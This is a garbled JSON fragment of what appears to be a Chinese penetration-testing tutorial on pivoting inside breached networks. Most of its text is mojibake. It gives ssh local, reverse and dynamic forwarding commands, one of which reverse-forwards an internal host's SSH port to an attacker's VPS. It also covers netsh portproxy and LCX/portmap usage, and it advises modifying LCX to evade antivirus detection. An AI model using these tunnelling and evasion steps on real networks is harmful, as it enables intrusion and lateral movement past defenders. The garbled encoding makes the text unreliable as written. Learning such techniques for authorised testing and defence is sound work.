ï¼Œå¯å°è¯•é€šè¿‡ä½¿ç”¨sshè¿›è¡Œç«¯å£è½¬å‘æ¥RDPç™»å½•å†…ç½‘ä¸»æœºï¼š\nåœ¨å¤–ç½‘linuxä¸Šä½¿ç”¨sshè¿›è¡Œç«¯å£æœ¬åœ°è½¬å‘\nssh -CfNg -L [æœ¬åœ°ç«¯å£]:[å†…ç½‘ä¸»æœºIP]:[å†…ç½‘ä¸»æœºç«¯å£] [å¤–ç½‘ä¸»æœºIP] æ¯”å¦‚è¿™é‡Œè½¬å‘3389ï¼š\nssh -CfNg -L 5678:[å†…ç½‘ä¸»æœºIP]:3389 [å¤–ç½‘ä¸»æœºIP] #æ‰§è¡Œå‘½ä»¤åè¾“å…¥è·å–åˆ°çš„å†…ç½‘ä¸»æœºè´¦æˆ·å¯†ç  æ¥ä¸‹æ¥å³å¯RDPè¿æ¥[å¤–ç½‘ä¸»æœºIP]:5678ï¼Œå®ç°ç™»å½•å†…ç½‘ä¸»æœºæ¡Œé¢\nåŒç†ï¼Œå¦‚æœå†…ç½‘çš„webæœåŠ¡å­˜åœ¨æ¼æ´ï¼Œä¹Ÿå¯ä»¥å°†å¯¹åº”ç«¯å£è½¬å‘åˆ°å¤–ç½‘ä¸»æœºè¿›è¡Œè®¿é—®å’Œç›¸åº”æ¼æ´åˆ©ç”¨\nè¿œç¨‹è½¬å‘ï¼ˆåå‘ï¼‰ æœ‰å¦‚ä¸‹åœºæ™¯ï¼Œé€šè¿‡é’“é±¼è·å–äº†å†…ç½‘linuxä¸»æœºAçš„shellï¼Œå·²çŸ¥å†…ç½‘linuxä¸»æœºBçš„3389å¼€å¯ï¼Œä¸”å·²è·å¾—å†…ç½‘linuxä¸»æœºçš„rootç”¨æˆ·å¯†ç ï¼Œå¯å°è¯•é€šè¿‡ä½¿ç”¨sshè¿›è¡Œç«¯å£è½¬å‘ç»™vpsï¼Œvpså†ä½¿ç”¨sshç™»å½•å†…ç½‘ä¸»æœº\nåœ¨å†…ç½‘ä¸»æœºAä¸Šä½¿ç”¨sshè¿›è¡Œç«¯å£è¿œç¨‹è½¬å‘ï¼š\nssh -CfNg -R [æœ¬åœ°ç«¯å£]:[Aä¸»æœºIP]:[å†…ç½‘ä¸»æœºç«¯å£] [å¤–ç½‘ä¸»æœºIP] æ¯”å¦‚è¿™é‡Œè½¬å‘22ï¼ˆsshï¼‰ï¼š\nssh -CfNg -R 7890:[Bä¸»æœºIP]:22 [æ”»å‡»è€…vps IP] #æ‰§è¡Œå‘½ä»¤åè¾“å…¥å…¬ç½‘æœåŠ¡å™¨å¯†ç  æ¥ä¸‹æ¥å³å¯åœ¨vpsä¸Šè®¿é—®ç›¸åº”ç«¯å£ï¼ˆè¯¥æ–¹æ³•åªèƒ½æœ¬åœ°è®¿é—®ç«¯å£ï¼‰è¿›è¡Œsshç™»å½•ï¼š\nssh root@127.0.0.1 -p 7890 åŠ¨æ€è½¬å‘ åŠ¨æ€è½¬å‘ç±»ä¼¼SOCKSä»£ç†ï¼Œä¸ä»…ä»…æ˜¯é’ˆå¯¹ä¹ˆæŸä¸€ä¸ªç«¯å£è¿›è¡Œè½¬å‘:\nssh -N -D [æœ¬åœ°ç›‘å¬IP]:[æœ¬åœ°ç›‘å¬ç«¯å£] [ç”¨æˆ·å]@[è·³æ¿æœºIP] ç„¶åé…ç½®æµè§ˆå™¨æˆ–ä½¿ç”¨ proxychains å·¥å…·æ¥é€šè¿‡è¿™ä¸ª SOCKS5 ä»£ç†è®¿é—®ç›®æ ‡ç½‘ç»œ\nNETSH netshæ˜¯windowsç³»ç»Ÿè‡ªå¸¦å‘½ä»¤è¡Œç¨‹åºï¼Œæ”»å‡»è€…ä¹Ÿæ— éœ€ä¸Šä¼ ç¬¬ä¸‰æ–¹å·¥å…·å³å¯åˆ©ç”¨netshç¨‹åºå¯è¿›è¡Œç«¯å£è½¬\nå‘æ“ä½œï¼Œå¯å°†å†…ç½‘ä¸­å…¶ä»–æœåŠ¡å™¨çš„ç«¯å£è½¬å‘è‡³æœ¬åœ°è®¿é—®\næ³¨ï¼šè¿è¡Œè¯¥å·¥å…·éœ€è¦ç®¡ç†å‘˜çš„æƒé™\nä½¿ç”¨åœºæ™¯ æ‹“æ‰‘å¦‚ä¸‹ï¼šæ”»å‡»è€…å·²è·å–å¤–ç½‘windowsä¸»æœºAçš„shellå’Œå†…ç½‘linuxä¸»æœºçš„rootç”¨æˆ·å¯†ç ï¼Œä½†æ— æ³•ç›´æ¥è®¿é—®å†…ç½‘Linuxä¸»æœºBã€‚æ­¤æ—¶å¯ä»¥å€ŸåŠ©Bæœºå™¨ä¸Šçš„netshå‘½ä»¤è¿›è¡Œç«¯å£è½¬å‘è®¿é—®æœºå™¨Cçš„ç«¯å£ï¼ˆæ³¨æ„åªèƒ½è®¿é—®ç«¯å£ï¼‰\nåœ¨ä¸»æœºAçš„shellä¸Šä½¿ç”¨netshè¿›è¡Œç«¯å£è½¬å‘ï¼š\nnetsh interface portproxy add v4tov4 listenaddress=[å¤–ç½‘ä¸»æœºIP] listenport=[å¤–ç½‘ä¸»æœºç«¯å£] connectport=[å†…ç½‘ä¸»æœºç«¯å£] connectaddress=[å†…ç½‘ä¸»æœºIP] æ¯”å¦‚è¿™é‡Œè½¬å‘å†…ç½‘ä¸»æœºBçš„22ç«¯å£åˆ°å¤–ç½‘ä¸»æœºAçš„9999ç«¯å£\nnetsh interface portproxy add v4tov4 listenaddress=[å¤–ç½‘ä¸»æœºIP] listenport=9999 connectport=22 connectaddress=[å†…ç½‘ä¸»æœºIP] æŸ¥çœ‹æ˜¯å¦å¼€å¯è½¬å‘\nnetsh interface portproxy show v4tov4 è‹¥æˆåŠŸå¼€å¯ï¼Œå³å¯åœ¨æ”»å‡»æœºä¸Šsshè¿æ¥å¤–ç½‘ä¸»æœºAçš„9999ç«¯å£ï¼Œä»è€Œç™»å½•å†…ç½‘ä¸»æœºBï¼š\nssh root@[å¤–ç½‘ä¸»æœºIP] -p 9999 ç»“æŸååˆ é™¤è½¬å‘å¦‚ä¸‹ï¼š\nnetsh interface portproxy delete v4tov4 listenaddress=[å¤–ç½‘ä¸»æœºIP] listenport=9999 ç«¯å£è½¬å‘çš„å±€é™æ€§ æ¯æ¬¡åªèƒ½å¯¹å•ä¸ªç«¯å£è¿›è¡Œè½¬å‘ï¼Œåœ¨é’ˆå¯¹å¤šä¸ªç«¯å£ç”šè‡³ä¸»æœºçš„æ¸—é€è¿‡ç¨‹ä¸å¤Ÿæ–¹ä¾¿\n",
        "summary": "éš§é“ä»£ç†-ç«¯å£è½¬å‘ç›¸å…³å·¥å…· LCX LCXæ˜¯ä¸€æ¬¾å†…ç½‘ç«¯å£è½¬å‘å·¥å…·ï¼Œåˆ†ä¸ºWindowsç‰ˆå’ŒLinuxç‰ˆï¼ŒLinuxç‰ˆæœ¬ä¸ºPortMapã€‚LCXæœ‰ç«¯å£æ˜ å°„å’Œç«¯å£è½¬å‘ä¸¤å¤§åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šå½“ç›®æ ‡çš„3389ç«¯å£åªå¯¹å†…å¼€æ”¾è€Œä¸å¯¹å¤–å¼€æ”¾æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç«¯å£æ˜ å°„å°†3389ç«¯å£æ˜ å°„åˆ°ç›®æ ‡çš„å…¶ä»–ç«¯å£ä½¿ç”¨ï¼›å½“ç›®æ ‡å¤„äºå†…ç½‘æˆ–ç›®æ ‡é…ç½®çš„ç­–ç•¥åªå…è®¸è®¿é—®æŸä¸€å›ºå®šç«¯å£æ—¶ï¼Œå¯ä»¥é€šè¿‡ç«¯å£è½¬å‘çªç ´é™åˆ¶\nç›®å‰å¾ˆå¤šæ€è½¯å·²ç»å°†LCXåŠ å…¥äº†ç‰¹å¾åº“ï¼Œæ‰€ä»¥åœ¨å®é™…åˆ©ç”¨æ—¶éœ€è¦è‡ªè¡Œåšå…æ€å¤„ç†\nWindowsç‰ˆçš„LCXç”¨æ³•ï¼š Usage:lcx.exe -\u0026lt;listen|tran|slave\u0026gt; \u0026lt;option\u0026gt; [-log logfile] -tran \u0026lt;ç­‰å¾…è¿æ¥çš„ç«¯å£\u0026gt; \u0026lt;ç›®æ ‡ip\u0026gt; \u0026lt;ç›®æ ‡ç«¯å£\u0026gt; (ç«¯å£æ˜ å°„) -listen \u0026lt;ç›‘å¬slaveè¯·æ±‚çš„ç«¯å£(å¯¹åº”slave çš„ç¬¬äºŒä¸ªå‚æ•°)\u0026gt; \u0026lt;ç­‰å¾…è¿æ¥çš„ç«¯å£\u0026gt; (ç«¯å£è½¬å‘) -slave \u0026lt;ä½ çš„ip\u0026gt; \u0026lt;ç›‘å¬ç«¯å£(å¯¹åº”listençš„ç¬¬ä¸€ä¸ªå‚æ•°)\u0026gt; \u0026lt;ç›®æ ‡ip\u0026gt; \u0026lt;ç›®æ ‡ç«¯å£\u0026gt; (ç«¯å£è½¬å‘) Linuxç‰ˆçš„LCXç”¨æ³•ï¼š linuxä¸‹çš„å·¥å…·åä¸ºportmap\nUsage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename] -v: version -h1: host1 -h2: host2 -p1: port1 -p2: port2 -log: log the data -m: the action method for this tool 1: listen on PORT1 and connect to HOST2:PORT2 2: listen on PORT1 and PORT2 3: connect to HOST1:PORT1 and HOST2:PORT2 ä½¿ç”¨æ¡ˆä¾‹ ç›®æ ‡æœºæœ‰å…¬ç½‘IPï¼š\n"
    }
]